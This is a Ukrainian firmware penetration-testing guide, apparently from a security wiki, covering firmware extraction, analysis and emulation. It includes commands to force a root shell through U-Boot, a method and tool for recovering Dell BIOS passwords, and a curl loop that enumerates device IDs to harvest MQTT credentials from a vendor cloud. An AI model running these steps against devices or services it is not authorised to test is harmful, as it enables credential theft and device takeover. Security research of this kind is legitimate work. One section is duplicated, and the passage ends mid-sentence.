Прошивка — це необхідне програмне забезпечення, яке забезпечує належну роботу пристроїв, керуючи взаємодією між апаратними компонентами та програмним забезпеченням, з яким працює користувач. Вона зберігається в постійній пам’яті, завдяки чому пристрій може отримувати доступ до важливих інструкцій відразу після ввімкнення, що дає змогу запустити операційну систему. Аналіз і потенційна модифікація прошивки — важливий етап виявлення вразливостей безпеки.<sup>[[2]](#references)[[3]](#references)</sup>

## **Збір інформації**

**Збір інформації** — важливий початковий етап для розуміння будови пристрою та використовуваних у ньому технологій. Він передбачає збір даних про:

- Архітектуру CPU та операційну систему, на якій він працює
- Особливості завантажувача
- Компонування апаратних засобів і специфікації компонентів
- Метрики кодової бази та розташування вихідного коду
- Зовнішні бібліотеки та типи ліцензій
- Історію оновлень і нормативні сертифікати
- Архітектурні діаграми та діаграми потоків
- Оцінки безпеки та виявлені вразливості

Для цього незамінними є інструменти **розвідки з відкритих джерел (OSINT)**, а також аналіз доступних компонентів програмного забезпечення з відкритим кодом за допомогою ручної та автоматизованої перевірки. Такі інструменти, як [Coverity Scan](https://scan.coverity.com) і [Semmle’s LGTM](https://lgtm.com/#explore), пропонують безкоштовний статичний аналіз, який можна використовувати для пошуку потенційних проблем.

## **Отримання прошивки**

Прошивку можна отримати різними способами, кожен з яких має свій рівень складності:

- **Безпосередньо** у джерела (розробників, виробників)
- **Зібрати** за наданими інструкціями
- **Завантажити** з офіційних сайтів підтримки
- Використовувати запити **Google dork**, щоб знаходити розміщені файли прошивки
- Отримати прямий доступ до **хмарного сховища** за допомогою таких інструментів, як [S3Scanner](https://github.com/sa7mon/S3Scanner)
- Перехопити **оновлення** за допомогою атак типу man-in-the-middle
- **Витягнути** з пристрою через такі інтерфейси, як **UART**, **JTAG** або **PICit**
- **Перехоплювати** запити на оновлення під час обміну даними пристрою
- Виявляти та використовувати **жорстко задані кінцеві точки оновлення**
- **Знімати дамп** із завантажувача або через мережу
- Якщо нічого не допомагає, **зняти та зчитати** мікросхему пам’яті за допомогою відповідних апаратних інструментів

### Лише журнали UART: примусово запустити root shell через середовище U-Boot у flash

Якщо RX UART ігнорується (доступні лише журнали), можна примусово запустити оболонку init, **відредагувавши blob середовища U-Boot офлайн**:<sup>[[6]](#references)</sup>

1. Зніміть дамп SPI flash за допомогою кліпси SOIC-8 і програматора (3,3 В):
   ```bash
   flashrom -p ch341a_spi -r flash.bin
   ```
2. Знайдіть розділ U-Boot env, відредагуйте `bootargs`, додавши `init=/bin/sh`, і **перерахуйте CRC32 для U-Boot env** у blob.
3. Перепрошийте лише розділ env і перезавантажте пристрій; на UART має з’явитися shell.

Це корисно для вбудованих пристроїв, де shell завантажувача вимкнено, але розділ env можна записувати через зовнішній доступ до flash.

## Аналіз прошивки

Тепер, коли ви **отримали прошивку**, потрібно витягти з неї інформацію, щоб зрозуміти, як із нею працювати. Для цього можна використовувати різні інструменти:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #print offsets in hex
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head # might find signatures in header
fdisk -lu <bin> #lists a drives partition and filesystems if multiple
```

Якщо за допомогою цих інструментів не знайдете багато даних, перевірте **ентропію** образу командою `binwalk -E <bin>`. Якщо ентропія низька, образ, імовірно, не зашифрований. Якщо висока — імовірно, зашифрований (або якимось чином стиснений).

### Диференційний аналіз flash-пам’яті та відновлювані сховища секретів XOR

Якщо формат зберігання параметра прошивки не задокументований, спочатку зробіть кілька однакових зчитувань flash-пам’яті, змініть **рівно один** параметр, знову створіть дамп усього чипа й порівняйте зміщення. Повторення експерименту з контрольованими значеннями допоможе відрізнити цей параметр від лічильників і метаданих запису; зміни за новими зміщеннями, а не на місці, свідчать про сховище з дозаписом або журналюванням. Зберігайте видалені записи та записи, позначені як видалені, оскільки їхні байти даних можуть залишатися доступними для відновлення.<sup>[[12]](#references)[[13]](#references)</sup>

```bash
sha256sum baseline-1.bin baseline-2.bin baseline-3.bin
cmp -l baseline-1.bin changed.bin
```

Після визначення області витягніть модулі прошивки за допомогою таких інструментів, як `binwalk`, і проаналізуйте функції запису та перевірки в Ghidra. Підтвердьте межі полів, заповнення, індексацію ключа й отримання ключа за кодом, а не лише виводьте схему з шаблонів шифротексту.<sup>[[12]](#references)</sup>

#### Відновлення ключів із зашифрованого заповнення нулями

Як описано в [шифруванні на основі XOR](../../crypto/symmetric/#xor-based-encryption), відомий відкритий текст дає змогу дізнатися байти ключового потоку за тими самими зміщеннями. Поле фіксованого розміру особливо вразливе, коли його заповнення нулями охоплює всі індекси циклічного XOR-ключа: зашифроване заповнення безпосередньо розкриває відповідні байти ключа, оскільки `0x00 XOR key_byte = key_byte`. Якщо охоплено всі індекси ключа, відновіть ключ із хвоста шифротексту та розшифруйте заповнені даними байти.<sup>[[12]](#references)</sup>

Формат пароля BIOS DVAR від Dell, що має вразливість, — наочний приклад: байт `0` 32-байтового поля зберігається у відкритому вигляді, а для байтів `1..31` використовується циклічний 20-байтовий ключ.<sup>[[12]](#references)</sup>

```text
stored[0] = password[0]
stored[i] = password[i] XOR key[(i - 1) mod 20]  # i = 1..31
```

Для пароля довжиною `L` позиції `L..31` до XOR були нульовими. Коли `L <= 12`, ці позиції охоплюють кожен індекс ключа, тож повний ключ і пароль відновлюються без brute force:<sup>[[12]](#references)</sup>

```text
key[(i - 1) mod 20] = stored[i]                  # padding positions
password[i] = stored[i] XOR key[(i - 1) mod 20] # populated positions
```

#### Витягування ключів з історичних записів

Не аналізуйте кожен запис окремо. Ключ DVAR приблизно обчислюється як `modified_md5(device_seed || variable_GUID || password[0])`: seed пристрою та GUID незмінні, а єдиний залежний від пароля вхідний параметр — його перший байт у відкритому вигляді. Це дає не більше ніж 256 ключів на пристрій, тому записи, що починаються з одного байта, використовують спільний ключ. Згрупуйте активні та видалені записи за цим байтом; короткий історичний запис може розкрити повний ключ завдяки доповненню й дати змогу розшифрувати поточний довший запис, у якого власного доповнення недостатньо. Тому ротація пароля може збільшити ризик витоку, якщо старий шифротекст позначено як видалений, а не стерто.<sup>[[12]](#references)</sup>

Інструмент [`dellpwn`](https://github.com/R3n5k1/dellpwn) знаходить DVAR, перевіряє кандидатні записи, відновлює паролі та може відображати байти збережених даних і ключа. Зберіть його з клонованого репозиторію та проскануйте перевірений образ flash-пам’яті таким чином:<sup>[[13]](#references)</sup>

```bash
cargo install --path .
dellpwn scan dump.bin --raw
dellpwn scan dump.bin --partial  # include uncertain recoveries
```

Для користувацьких парсерів відсіюйте хибні спрацьовування за структурою записів, обмеженнями на друковані символи, перевірками заповнення нулями, ентропією ключа та узгодженістю під час циклічного повторення ключа. Якщо в повторних дампах спостерігаються розріджені зміни бітів під час кожного запису, перелічіть виявлені маски й ранжуйте можливі виправлення за цими обмеженнями, але позначайте неоднозначні символи замість того, щоб подавати евристичний результат як точне відновлення.<sup>[[12]](#references)</sup>

Замість оборотного шифротексту у верифікаторах паролів слід зберігати хеш із сіллю, обчислений за допомогою ітераційного одностороннього хешування, а сховища з журналюванням структур слід надійно очищати від застарілих секретних даних.<sup>[[12]](#references)</sup>

### Отримання файлової системи

За допомогою попередніх інструментів із коментарями, наприклад `binwalk -ev <bin>`, ви мали змогу **витягти файлову систему**.\
Зазвичай binwalk витягує її в **папку з назвою типу файлової системи**. Зазвичай це один із таких типів: squashfs, ubifs, romfs, rootfs, jffs2, yaffs2, cramfs, initramfs.

#### Ручне витягування файлової системи

Іноді binwalk **не має magic byte файлової системи у своїх сигнатурах**. У таких випадках скористайтеся binwalk, щоб **знайти зсув файлової системи й вирізати стиснуту файлову систему** з бінарного файла, а потім **витягти файлову систему вручну**, відповідно до її типу, виконавши наведені нижче кроки.

```
$ binwalk DIR850L_REVB.bin

DECIMAL HEXADECIMAL DESCRIPTION
----------------------------------------------------------------------------- ---

0 0x0 DLOB firmware header, boot partition: """"dev=/dev/mtdblock/1""""
10380 0x288C LZMA compressed data, properties: 0x5D, dictionary size: 8388608 bytes, uncompressed size: 5213748 bytes
1704052 0x1A0074 PackImg section delimiter tag, little endian size: 32256 bytes; big endian size: 8257536 bytes
1704084 0x1A0094 Squashfs filesystem, little endian, version 4.0, compression:lzma, size: 8256900 bytes, 2688 inodes, blocksize: 131072 bytes, created: 2016-07-12 02:28:41
```

Запустіть наведену нижче **команду dd**, щоб вирізати файлову систему Squashfs.

```
$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs

8257536+0 records in

8257536+0 records out

8257536 bytes (8.3 MB, 7.9 MiB) copied, 12.5777 s, 657 kB/s
```

Альтернативно можна виконати таку команду.

`$ dd if=DIR850L_REVB.bin bs=1 skip=$((0x1A0094)) of=dir.squashfs`

- Для squashfs (використовується у прикладі вище)

`$ unsquashfs dir.squashfs`

Після цього файли будуть у каталозі "`squashfs-root`".

- Файли архівів CPIO

`$ cpio -ivd --no-absolute-filenames -F <bin>`

- Для файлових систем jffs2

`$ jefferson rootfsfile.jffs2`

- Для файлових систем ubifs із NAND flash

`$ ubireader_extract_images -u UBI -s <start_offset> <bin>`

`$ ubidump.py <bin>`

### Відновлення розділених вбудованих кореневих файлових систем

Якщо дамп raw eMMC/SSD містить коректний заголовок файлової системи, але її зміщення метаданих виходять за межі номінального розділу, не поспішайте вважати її пошкодженою. Код завантаження вбудованих систем може збирати реальний кореневий пристрій із кількох фізичних діапазонів за допомогою Device Mapper, тому карвінг одного розділу GPT дає лише перший сегмент.<sup>[[9]](#references)</sup>

#### Первинна перевірка повного образу носія

Спочатку переконайтеся, що отримання даних завершено, розмір образу стабільний і жоден процес запису більше не використовує його. Якщо ім’я файлу містить адресу початку/кінця, порівняйте цей діапазон із фактичною кількістю байтів. Відновіть GPT у режимі лише для читання та під’єднайте лише потрібний діапазон; **не** запускайте `vgchange -ay` для ненадійного фізичного тому на робочій станції, оскільки можливі конфлікти груп томів і ненавмисний запис.<sup>[[9]](#references)</sup>

```bash
stat -c '%s bytes' firmware.bin
lsof -- firmware.bin
fdisk -l firmware.bin
parted firmware.bin unit B print

# Inspect one partition without copying it
sudo losetup --find --show --read-only \
  --offset "$PART_OFF" --sizelimit "$PART_LEN" firmware.bin
```

Використовуйте одноразову VM, якщо оригінальна логіка init або стек LVM має бачити весь образ. Історичні журнали завантаження зі стандартного розділу завантаження особливо корисні: bootloader міг записати зсуви пропрієтарного контейнера, довжини компонентів, вибір слота, правила вирівнювання та результати перевірки підпису. Використайте ці значення, щоб виокремити вбудований командний рядок, ядро та initramfs, а потім незалежно перевірте кожен результат за допомогою `file`, магічних байтів і `binwalk`; читання до кінця контейнера може ненавмисно додати до ядра initrd, об’єкт ACPI або підпис.<sup>[[9]](#references)</sup>

#### Відновлення карти блоків під час завантаження

Витягніть initramfs ядра та виконайте зворотний аналіз його `/init` і будь-яких бібліотек для роботи зі сховищем. У [Reversing Tools & Basic Methods](../../reversing/reversing-tools-basic-methods/) знайдіть посилання на рядки `/proc/cmdline`, `/dev/mapper/`, `dmsetup`, `BLKGETSIZE64` і шляхи до розділів; потім простежте код, який вибирає активний слот A/B і формує таблицю. Корисні початкові команди radare2: `r2 -A init`, `afl`, `pdf @ main` і `pdf @ fcn.xxxxx`.<sup>[[9]](#references)</sup>

Ціль linear зіставляє послідовні діапазони віртуального пристрою з діапазонами одного або кількох базових пристроїв. Типова відновлена таблиця з двома сегментами має такий вигляд (усі позиції та довжини вказано в секторах по 512 байтів):<sup>[[9]](#references)[[10]](#references)</sup>

```text
0              <seg1_sectors> linear /dev/mmcblk0p2 0
<seg1_sectors> <seg2_sectors> linear /dev/mmcblk0p4 <tail_start>
```

Точно відтворюйте арифметику машинного коду, зокрема розрядність цілих чисел, зсуви та перетворення одиниць. Наприклад, наведений нижче вираз округлює розмір у байтах донизу до межі 4 КіБ і лише потім перетворює його на сектори по 512 байтів; заміна на `p4_bytes // 512` зсуває вибраний хвостовий фрагмент на `p4_bytes % 4096`, якщо розділ не вирівняний за сторінкою.<sup>[[9]](#references)</sup>

```python
p4_sectors = (p4_bytes >> 12) << 3
effective_bytes = p4_sectors * 512
tail_start = effective_bytes - tail_distance
```

Відновіть плаский образ для аналізу, копіюючи діапазони в порядку таблиці обмеженими блоками, замість того щоб завантажувати весь дамп носія в пам’ять. Це також дає змогу уникнути створення пристроїв-меперів на хості. Зберігайте зміщення, отримані з GPT, перевернуту кількість секторів і кінцеву довжину вихідних даних як окремі твердження.<sup>[[9]](#references)</sup>

#### Відрізняйте пошкодження від постійної помилки реконструкції

Для SquashFS перевірте магічне значення `hsqs` і декодуйте 64-бітне поле `bytes_used` у порядку little-endian зі зміщення 40 суперблоку перед запуском `unsquashfs`. Якщо витягування не вдається в кількох не пов’язаних між собою структурах, шукайте в широкому діапазоні навколо очікуваних позицій і вимагайте надійних структурних ознак: блока метаданих, який можна розпакувати, кількох послідовних коректних записів каталогу, правдоподібних полів inode, кореневого inode, узгодженого з кількістю inode, або коректної структури метаданих цілісності. Одного збігу магічного значення недостатньо.<sup>[[9]](#references)</sup>

```python
import struct

with open("rootfs.img", "rb") as f:
    sb = f.read(96)
assert sb[:4] == b"hsqs"
bytes_used = struct.unpack_from("<Q", sb, 40)[0]
nominal_end = (bytes_used + 4095) & ~4095
print(hex(bytes_used), hex(nominal_end))
```

Коли однакова знакова дельта робить коректними незалежні структури — наприклад, метадані каталогу та запис verity, — імовірна причина полягає в систематичній помилці у визначенні початку сегмента, а не у відсутніх байтах. Поверніться до зворотного обчислення та перевірте, чи не було відкинуто остачі, чи правильно враховано знаковість і переповнення, а також чи не виникла помилка округлення до меж сектора або сторінки, перш ніж намагатися відновити втрачені файли або виправити метадані файлової системи.<sup>[[9]](#references)</sup>

Нарешті, не змішуйте межі захисту: томи LUKS із ключами, запечатаними в TPM, захищають конфіденційність даних, тоді як підписане зіставлення dm-verity захищає цілісність кореневої файлової системи. Програмний TPM не відновить ключ, запечатаний у вихідному фізичному TPM, а завантаження зміненого SquashFS через дослідницький init, який пропускає перевірку verity, не підробляє підпис і не зламує dm-verity.<sup>[[9]](#references)</sup>

## Аналіз прошивки

Після отримання прошивки важливо проаналізувати її структуру та потенційні вразливості. Для цього застосовують різні інструменти, щоб дослідити образ прошивки й отримати з нього цінні дані.

### Інструменти для початкового аналізу

Наведено набір команд для первинної перевірки двійкового файла (позначеного як `<bin>`). Ці команди допомагають визначити типи файлів, витягти рядки, проаналізувати двійкові дані та дослідити розділи й файлові системи:

```bash
file <bin>
strings -n8 <bin>
strings -tx <bin> #prints offsets in hexadecimal
hexdump -C -n 512 <bin> > hexdump.out
hexdump -C <bin> | head #useful for finding signatures in the header
fdisk -lu <bin> #lists partitions and filesystems, if there are multiple
```

Щоб оцінити стан шифрування образу, перевіряють **ентропію** за допомогою `binwalk -E <bin>`. Низька ентропія вказує на відсутність шифрування, а висока — на можливе шифрування або стиснення.

Для вилучення **вбудованих файлів** рекомендовано використовувати такі інструменти й ресурси, як документація **file-data-carving-recovery-tools** і **binvis.io** для перевірки файлів.

### Вилучення файлової системи

За допомогою `binwalk -ev <bin>` зазвичай можна вилучити файлову систему, часто в каталог із назвою її типу (наприклад, squashfs, ubifs). Однак, якщо **binwalk** не може розпізнати тип файлової системи через відсутність magic bytes, її потрібно вилучити вручну. Для цього за допомогою `binwalk` знаходять зсув файлової системи, а потім командою `dd` вирізають її:

```bash
$ binwalk DIR850L_REVB.bin

$ dd if=DIR850L_REVB.bin bs=1 skip=1704084 of=dir.squashfs
```

Після цього, залежно від типу файлової системи (наприклад, squashfs, cpio, jffs2, ubifs), для ручного вилучення вмісту використовують різні команди.

### Аналіз файлової системи

Після вилучення файлової системи починається пошук недоліків безпеки. Перевіряють незахищені мережеві демони, жорстко закодовані облікові дані, кінцеві точки API, функції сервера оновлень, нескомпільований код, скрипти запуску та скомпільовані двійкові файли для офлайн-аналізу.

**Основні розташування** та **елементи** для перевірки:

- **etc/shadow** і **etc/passwd** — облікові дані користувачів
- SSL-сертифікати й ключі в **etc/ssl**
- Файли конфігурації та скрипти на предмет потенційних вразливостей
- Вбудовані двійкові файли для подальшого аналізу
- Типові вебсервери та двійкові файли пристроїв IoT

Виявити конфіденційну інформацію та вразливості у файловій системі допомагають такі інструменти:

- [**LinPEAS**](https://github.com/carlospolop/PEASS-ng) і [**Firmwalker**](https://github.com/craigz28/firmwalker) для пошуку конфіденційної інформації
- [**The Firmware Analysis and Comparison Tool (FACT)**](https://github.com/fkie-cad/FACT_core) для комплексного аналізу прошивки
- [**FwAnalyzer**](https://github.com/cruise-automation/fwanalyzer), [**ByteSweep**](https://gitlab.com/bytesweep/bytesweep), [**ByteSweep-go**](https://gitlab.com/bytesweep/bytesweep-go) і [**EMBA**](https://github.com/e-m-b-a/emba) для статичного й динамічного аналізу

### Перевірка безпеки скомпільованих двійкових файлів

Вразливості слід шукати як у вихідному коді, так і у скомпільованих двійкових файлах, знайдених у файловій системі. Такі інструменти, як **checksec.sh** для двійкових файлів Unix і **PESecurity** для двійкових файлів Windows, допомагають виявити незахищені файли, якими можна скористатися.

## Отримання хмарної конфігурації та облікових даних MQTT за допомогою похідних URL-токенів

Багато IoT-концентраторів отримують конфігурацію для кожного пристрою з кінцевої точки хмари, що має такий вигляд:<sup>[[5]](#references)</sup>

- `https://<api-host>/pf/<deviceId>/<token>`

Під час аналізу прошивки можна виявити, що `<token>` локально генерується на основі ідентифікатора пристрою за допомогою жорстко закодованого секрету, наприклад:

- token = MD5( deviceId || STATIC_KEY ) і представлений у вигляді шістнадцяткового рядка у верхньому регістрі

Така конструкція дає змогу будь-кому, хто дізнається deviceId і STATIC_KEY, відновити URL-адресу й завантажити хмарну конфігурацію, у якій часто містяться облікові дані MQTT у відкритому тексті та префікси топіків.

Практичний порядок дій:

1) Отримайте deviceId з журналів завантаження UART

- Під’єднайте адаптер UART на 3,3 В (TX/RX/GND) і перехопіть журнали:

```bash
picocom -b 115200 /dev/ttyUSB0
```

- Шукайте рядки, що виводять шаблон URL хмарної конфігурації та адресу брокера, наприклад:

```
Online Config URL https://api.vendor.tld/pf/<deviceId>/<token>
MQTT: mqtt://mq-gw.vendor.tld:8001
```

2) Відновіть STATIC_KEY і алгоритм токена з firmware

- Завантажте бінарні файли в Ghidra/radare2 і знайдіть шлях до конфігурації ("/pf/") або використання MD5.
- Підтвердьте алгоритм (наприклад, MD5(deviceId||STATIC_KEY)).
- Обчисліть токен у Bash і переведіть дайджест у верхній регістр:

```bash
DEVICE_ID="d88b00112233"
STATIC_KEY="cf50deadbeefcafebabe"
printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}'
```

3) Зберіть конфігурацію cloud і облікові дані MQTT

- Сформуйте URL і отримайте JSON за допомогою curl; розберіть його за допомогою jq, щоб витягти секрети:

```bash
API_HOST="https://api.vendor.tld"
TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
curl -sS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq .
# Fields often include: mqtt host/port, clientId, username, password, topic prefix (tpkfix)
```

4) Зловживайте MQTT у відкритому тексті та слабкими ACL для топіків (якщо є)

- Використовуйте отримані облікові дані, щоб підписатися на топіки обслуговування та шукати конфіденційні події:

```bash
mosquitto_sub -h <broker> -p <port> -V mqttv311 \
  -i <client_id> -u <username> -P <password> \
  -t "<topic_prefix>/<deviceId>/admin" -v
```

5) Перебирайте передбачувані ID пристроїв (у великому масштабі, за наявності дозволу)

- Багато екосистем вбудовують байти OUI/продукту/типу виробника, за якими йде послідовний суфікс.
- Можна перебирати можливі ID, програмно генерувати токени та отримувати конфігурації:

```bash
API_HOST="https://api.vendor.tld"; STATIC_KEY="cf50deadbeef"; PREFIX="d88b1603" # OUI+type
for SUF in $(seq -w 000000 0000FF); do
  DEVICE_ID="${PREFIX}${SUF}"
  TOKEN=$(printf "%s" "${DEVICE_ID}${STATIC_KEY}" | md5sum | awk '{print toupper($1)}')
  curl -fsS "$API_HOST/pf/${DEVICE_ID}/${TOKEN}" | jq -r '.mqtt.username,.mqtt.password' | sed "/null/d" && echo "$DEVICE_ID"
done
```

Нотатки
- Завжди отримуйте явний дозвіл перед спробою масового перебирання.
- За можливості віддавайте перевагу емуляції або статичному аналізу для отримання секретів без модифікації цільового обладнання.


Процес емуляції firmware дає змогу виконувати **динамічний аналіз** роботи пристрою або окремої програми. Такий підхід може ускладнюватися залежностями від обладнання або архітектури, але перенесення root filesystem або певних binaries на пристрій із відповідною архітектурою та порядком байтів, наприклад Raspberry Pi, або на попередньо створену віртуальну машину може допомогти провести подальше тестування.

### Емуляція окремих binaries

Для аналізу окремих програм важливо визначити порядок байтів і архітектуру CPU програми.

#### Приклад з архітектурою MIPS

Щоб емулювати binary для архітектури MIPS, можна скористатися командою:

```bash
file ./squashfs-root/bin/busybox
```

А щоб встановити необхідні інструменти емуляції:

```bash
sudo apt-get install qemu qemu-user qemu-user-static qemu-system-arm qemu-system-mips qemu-system-x86 qemu-utils
```

Для MIPS (big-endian) використовується `qemu-mips`, а для бінарних файлів із little-endian — `qemu-mipsel`.

#### Емуляція архітектури ARM

Для бінарних файлів ARM процес подібний: для емуляції використовується емулятор `qemu-arm`.

### Повна емуляція системи

Такі інструменти, як [Firmadyne](https://github.com/firmadyne/firmadyne), [Firmware Analysis Toolkit](https://github.com/attify/firmware-analysis-toolkit) та інші, забезпечують повну емуляцію прошивки, автоматизують цей процес і допомагають у динамічному аналізі.

### Відновлення розділених і перевірених кореневих файлових систем для емуляції

Якщо суперблок SquashFS читається, але зміщення inode, каталогів або таблиці фрагментів неможливі, не поспішайте виправляти `unsquashfs`. Виконайте реверс-інжиніринг бінарного файлу раннього завантаження та відтворіть граф блокових пристроїв, який він створює: у вбудованих системах може бути номінальний кореневий розділ, але справжня файлова система створюється за допомогою зіставлення `dm-linear`, яке додає сектори з іншого розділу. Перевірки лише суперблока можуть пройти успішно, навіть якщо всі наступні блоки метаданих зміщені.<sup>[[11]](#references)</sup>

Точно відтворюйте арифметичні операції прошивки. Зокрема, визначте, чи довжини задані в байтах, секторах по 512 байтів або сторінках по 4 KiB; відтворіть зсуви та усічення в початковому порядку; врахуйте залежні від банку кінцеві області в схемах A/B. Наприклад, `(partition_bytes >> 12) << 3` спочатку усікає значення до межі 4 KiB і лише тоді виражає результат у секторах по 512 байтів; заміна на `partition_bytes // 512` може змістити додану область на кілька кілобайтів і пошкодити всі наступні таблиці SquashFS.<sup>[[11]](#references)</sup>

Корисний робочий процес перевірки:<sup>[[11]](#references)</sup>

1. Відновіть джерельний пристрій, початковий сектор і довжину кожного сегмента `dm-linear` із бінарного файлу verifier/init.
2. Об’єднайте або зіставте області, не змінюючи семантику їхнього вирівнювання.
3. Якщо витягування все ще не вдається, шукайте лише в невеликому діапазоні навколо передбаченої межі та вимагайте наявності кількох послідовних коректних структур метаданих, а не покладайтеся лише на правдоподібний суперблок.
4. Запустіть незмінений `unsquashfs` для відновленого образу; успішний обхід усіх каталогів і фрагментів є вагомішим доказом, ніж результат `unsquashfs -stat`.

#### Заміна dm-verity під контролем аналітика

Коли аналітик контролює ядро QEMU, initramfs і віртуальні диски, змінену кореневу файлову систему можна завантажити, замінивши PID 1 із перевіркою виробника на невеликий статично скомпонований init. Це **підміна ланцюжка завантаження в лабораторії**, а не злам dm-verity, його RSA-підпису, Secure Boot чи ключа, захищеного TPM.<sup>[[11]](#references)</sup>

Замінний init має відтворювати операційні кроки початкового процесу завантаження: змонтувати `devtmpfs`, викликати `setsid()`, під’єднати `/dev/console` до файлових дескрипторів 0–2, змонтувати `/proc` і `/sys`, дочекатися наданого блокового пристрою, змонтувати відредаговану кореневу файлову систему лише для читання, від’єднати псевдофайлові системи старого кореня, перемістити нове монтування на `/`, виконати `chroot` і `execve()` для оригінального `/sbin/init` прошивки. Від’єднання `/dev`, `/proc` і `/sys` **до** `MS_MOVE` дає змогу уникнути випадкового від’єднання точок монтування, що належать новій кореневій файловій системі.<sup>[[11]](#references)</sup>

Зберігайте змінюваний стан пристрою окремо від зміненої незмінної кореневої файлової системи. Оверлей qcow2 може зберегти стан LVM початкового диска, тоді як другий диск virtio лише для читання надає відредагований SquashFS:<sup>[[11]](#references)</sup>

```bash
qemu-img create -f qcow2 -F raw -b emmc.raw overlay.qcow2
qemu-system-x86_64 ... -kernel bzImage -initrd custom-initramfs.cpio.gz \
  -drive if=none,id=emmc,format=qcow2,file=overlay.qcow2 \
  -device sdhci-pci -device sd-card,drive=emmc \
  -drive if=virtio,format=raw,readonly=on,file=rootfs-edited.squashfs
```

#### Налагодження стану образу в автономному режимі

Перевіряйте постійний стан поза гостьовою системою, якщо повільне завантаження, руйнівні сценарії запуску або ненадійне ведення журналу в консолі ускладнюють пошук причини збою. Ніколи не підключайте overlay, який використовує запущена VM; надайте до нього доступ за допомогою `qemu-nbd`, обмежте виявлення LVM потрібним розділом NBD і деактивуйте групу томів перед відключенням.<sup>[[11]](#references)</sup>

```bash
sudo modprobe nbd max_part=16
sudo qemu-nbd --connect=/dev/nbd0 overlay.qcow2
sudo vgscan --config 'devices { filter = ["a|/dev/nbd0p4|", "r|.*|"] }'
# inspect/fsck/mount the discovered logical volumes
sudo vgchange -an VG_NAME
sudo qemu-nbd --disconnect /dev/nbd0
```

Для відтворюваної ізоляції несправностей записуйте файли-маркери з часовими позначками на стабільний доступний для запису том і перевіряйте їх офлайн; `/dev/kmsg`, FIFO та тимчасові консолі можуть давати хибнонегативні результати через обмеження частоти запису або передчасне завершення процесу. Також порівнюйте точні інтерфейси між рівнями, перш ніж змінювати не пов’язаний із проблемою код: `uname -r` і `/lib/modules/`, функції ext4 на диску та конфігурацію ядра, а також покоління Mesa `libGL` і ABI DRI-драйвера та назви драйверів, визначені за PCI. Компонент може існувати й навіть успішно виконати `dlopen()`, але залишатися непридатним до використання, якщо його споживач очікує інший ABI.<sup>[[11]](#references)</sup>

## Практичний динамічний аналіз

На цьому етапі для аналізу використовують реальне або емульоване середовище пристрою. Важливо зберегти доступ до оболонки ОС і файлової системи. Емуляція може не повністю відтворювати взаємодію з обладнанням, тому іноді доводиться перезапускати емулятор. Під час аналізу слід повторно перевірити файлову систему, експлуатувати доступні вебсторінки та мережеві служби, а також дослідити вразливості bootloader. Перевірки цілісності прошивки мають вирішальне значення для виявлення потенційних вразливостей типу backdoor.

## Методи аналізу під час виконання

Аналіз під час виконання передбачає взаємодію з процесом або бінарним файлом у його робочому середовищі. Для встановлення точок зупинки та виявлення вразливостей за допомогою fuzzing та інших методів використовують такі інструменти, як gdb-multiarch, Frida і Ghidra.

Для вбудованих цільових систем без повноцінного налагоджувача **скопіюйте на пристрій статично скомпонований `gdbserver`** і під’єднайтеся до нього віддалено:<sup>[[6]](#references)</sup>

```bash
# On device
gdbserver :1234 /usr/bin/targetd
```

```bash
# On host
gdb-multiarch /path/to/targetd
target remote <device-ip>:1234
```

### Зіставлення повідомлень Zigbee / радіопроцесора

У IoT-хабах RF-стек часто розділений між **радіо MCU** та процесом Linux userland. Корисний робочий процес — простежити шлях:<sup>[[8]](#references)</sup>

1. **RF-кадр** в ефірі
2. **парсер на боці контролера** на радіо MCU
3. **текстовий або TLV-протокол через serial/UART**, що передається до Linux (наприклад, `/dev/tty*`)
4. **диспетчер застосунку** в основному daemon
5. **обробник, специфічний для протоколу / машина станів**

Така архітектура створює дві цілі для реверсингу замість однієї. Якщо контролер перетворює бінарні радіокадри на текстовий протокол, наприклад `Group,Command,arg1,arg2,...`, з’ясуйте:

- **групи повідомлень** і таблиці диспетчеризації
- які повідомлення можуть надходити з **мережі**, а які — від самого контролера
- точні **поля-дискримінатори виробника** (наприклад, Zigbee `manufacturer_code` і власний `cluster_command`)
- до яких обробників можна дістатися лише під час **commissioning**, виявлення або завантаження прошивки/моделі

Для Zigbee перехопіть трафік pairing і перевірте, чи ціль досі покладається на стандартний **Link Key** `ZigBeeAlliance09`. Якщо так, перехоплення трафіку commissioning може розкрити **Network Key**. Коди встановлення Zigbee 3.0 зменшують цей ризик, тож зафіксуйте, чи тестований пристрій справді вимагає їх використання.

### Обробники протоколу виробника та доступність, обмежена FSM

Команди Zigbee/ZCL виробника часто є кращою ціллю, ніж стандартизовані кластери, оскільки вони ведуть до **власного коду парсингу** та внутрішніх **FSM** з менш перевіреною часом валідацією.<sup>[[8]](#references)</sup>

Практичний робочий процес:

- Реверсніть диспетчер команд, доки не знайдете **обробник лише для виробника**.
- Відновіть таблиці **станів FSM**, **подій**, **перевірок**, **дій** і **наступних станів**.
- Визначте **перехідні стани**, що автоматично просуваються далі, а також гілки повторних спроб/помилок, які зрештою скидають або звільняють контрольований атакувальником стан.
- З’ясуйте, які легітимні обміни протоколу потрібні, щоб перевести daemon у вразливий стан, замість того щоб припускати, що до вразливого обробника можна дістатися завжди.

Для протоколів, чутливих до часу, повторне відтворення пакетів із Python-фреймворку може бути надто повільним. Надійніший підхід — емулювати легітимний пристрій на реальному обладнанні (наприклад, **nRF52840**) зі стеком виробничого рівня, щоб відтворити потрібні **endpoints**, **attributes** і таймінги commissioning.

### Клас помилок у фрагментованому завантаженні в embedded daemon

Поширений клас помилок прошивки трапляється під час **фрагментованого завантаження blob/model/configuration**:<sup>[[8]](#references)</sup>

1. **Перший фрагмент** (`offset == 0`) зберігає `ctx->total_size` і виділяє пам’ять через `malloc(total_size)`.
2. Наступні фрагменти перевіряють лише керовані атакувальником **локальні для пакета** поля, як-от `packet_total_size >= offset + chunk_len`.
3. Копіювання виконується через `memcpy(&ctx->buffer[offset], chunk, chunk_len)` без перевірки розміру відносно **початково виділеної пам’яті**.

Це дає змогу атакувальнику надіслати:

- Перший коректний фрагмент із **малим** оголошеним загальним розміром, щоб змусити систему виділити невеликий блок у heap.
